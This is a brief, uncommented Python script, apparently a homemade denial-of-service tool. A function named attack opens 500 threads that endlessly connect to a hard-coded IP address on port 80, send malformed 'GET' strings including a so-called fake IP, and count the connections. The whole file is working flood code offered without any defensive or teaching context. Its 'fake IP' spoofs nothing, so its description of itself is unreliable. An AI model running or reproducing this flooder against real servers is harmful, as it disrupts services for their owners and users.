import threading
import socket

target = "172.20.10.1" 
port = 80
fake_ip = "182.21.32.1"
already_connected = 0
def attack():
    while True:
        s =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((target,port))
        s.sendto(("GET" + target + "\n\n\n").encode('ascii'),(target,port))
        s.sendto(("GET" + fake_ip + "\n\n\n").encode('ascii'),(target,port))
        s.close();
        global already_connected
        already_connected += 1
        print(already_connected)

for i in range(500):
    thread = threading.Thread(target =attack)
    thread.start()

